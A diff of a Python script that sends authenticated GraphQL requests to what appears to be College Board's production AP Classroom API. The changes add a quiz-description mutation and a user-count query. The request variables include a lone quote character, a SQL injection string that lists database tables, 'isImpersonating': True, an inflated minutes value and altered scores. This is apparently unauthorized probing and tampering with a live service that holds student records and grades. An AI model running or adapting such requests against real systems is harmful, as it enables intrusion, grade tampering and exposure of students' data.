@@ -5,15 +5,12 @@ import json
 
 with open("./token.txt") as file:
     BEARERTOKEN = file.read()
-    
+
 # Create a GraphQL client
 transport = RequestsHTTPTransport(
-    url='https://apc-api-production.collegeboard.org/fym/graphql',
+    url="https://apc-api-production.collegeboard.org/fym/graphql",
     use_json=True,
-    headers={
-        'Authorization': BEARERTOKEN,
-        'Content-Type': 'application/json'
-    },
+    headers={"Authorization": BEARERTOKEN, "Content-Type": "application/json"},
     verify=True,
     retries=3,
 )
@@ -21,39 +18,29 @@ transport = RequestsHTTPTransport(
 client = Client(transport=transport, fetch_schema_from_transport=False)
 
 # GraphQL query template
-query = gql("""
+mquery = gql(
+    """
     
-query IntrospectionQuery {
-  __schema {
-    mutationType {
-      fields {
-        name
-        description
-        args {
-          name
-          description
-          type {
-            kind
-            name
-            ofType {
-              name
-              kind
-            }
-          }
-          defaultValue
+    mutation updateQuizDescription($item_id: Int!, $description: String!) {
+        updateQuizDescription(itemId: $item_id, description: $description) {
+            ok
         }
-        type {
-          name
-          kind
-        }
-      }
     }
-  }
-}
+
+"""
+)
+# GraphQL query template
+rquery = gql(
+    """
+    query users {
+        users{
+            totalCount
+        }
+    }
 
 
-
-""")
+"""
+)
 
 # List of different assignment IDs
 assignment_ids = ["63276724"]
@@ -64,13 +51,30 @@ for assignment_id in assignment_ids:
     start_time = time.time()
 
     params = {
-    # 'id': '123',
-    'assignmentId': '65806628',
-    'scores': '{"228490232" : 36}',
-    'scoringCompleted': False,
-    "studentId": STUDENTID
+        'id': "'",
+        # "assignmentId": "66906187",
+        "sort": "on",
+        "filter": None,
+        "before": None,
+        "after": None,
+        "first": None,
+        "last": None,
+        "assignmentId": "66906187",
+        "item_id": "0",
+        "scores": '["36"]',
+        "scoringCompleted": False,
+        "studentId": STUDENTID,
+        "studentIds": [STUDENTID],
+        "subjectId": 1,
+        "educationPeriod": "26",
+        "isImpersonating": True,
+        "masterSubjectId": "1",
+        "includePriorStudents": "True",
+        "copyQuestion": True,
+        "minutes": 50000000,
+        "description": "SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE();",
     }
-    result = client.execute(query, variable_values=params)
+    result = client.execute(rquery, variable_values=params)
     end_time = time.time()
     elapsed_time = end_time - start_time
     print(f"Elapsed time: {elapsed_time} seconds")
